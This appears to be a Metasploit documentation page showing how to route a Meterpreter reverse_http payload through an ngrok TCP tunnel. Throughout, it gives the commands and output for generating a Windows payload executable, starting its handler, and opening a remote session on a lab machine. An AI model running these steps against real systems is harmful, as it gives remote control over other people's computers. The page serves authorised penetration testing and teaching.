# Overview
## Usage with payloads
### Payload Demo
ngrok side:
```
$ ngrok tcp localhost:4444
ngrok                                                           (Ctrl+C to quit)

Take our ngrok in production survey! https://forms.gle/aXiBFWzEA36DudFn6

Session Status                online
Account                       ????? (Plan: Personal)
Version                       3.16.0
Region                        United States (us)
Latency                       33ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://4.tcp.ngrok.io:17511 -> localhost:4444

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```

resolve the hostname `4.tcp.ngrok.io` to an IP address
```
$ dig +short 4.tcp.ngrok.io
192.0.2.1
```

metasploit side:
```msf
msf6 > use payload/windows/x64/meterpreter/reverse_http
msf6 payload(windows/x64/meterpreter/reverse_http) > set LHOST 192.0.2.1
LHOST => 192.0.2.1
msf6 payload(windows/x64/meterpreter/reverse_http) > set LPORT 17511
LPORT => 17511
msf6 payload(windows/x64/meterpreter/reverse_http) > set ReverseListenerBindAddress 127.0.0.1
ReverseListenerBindAddress => 127.0.0.1
msf6 payload(windows/x64/meterpreter/reverse_http) > set ReverseListenerBindPort 4444
ReverseListenerBindPort => 4444
msf6 payload(windows/x64/meterpreter/reverse_http) > to_handler 
[*] Payload Handler Started as Job 2
msf6 payload(windows/x64/meterpreter/reverse_http) > 
[*] Started HTTP reverse handler on http://127.0.0.1:4444

msf6 payload(windows/x64/meterpreter/reverse_http) > generate -f exe -o ngrok_payload.exe
[*] Writing 7168 bytes to ngrok_payload.exe...
msf6 payload(windows/x64/meterpreter/reverse_http) > 
[*] http://127.0.0.1:4444 handling request from 127.0.0.1; (UUID: ghzekibo) Staging x64 payload (202844 bytes) ...
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:55468) at 2024-09-10 16:43:58 -0400

msf6 payload(windows/x64/meterpreter/reverse_http) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: MSFLAB\smcintyre
meterpreter >
```

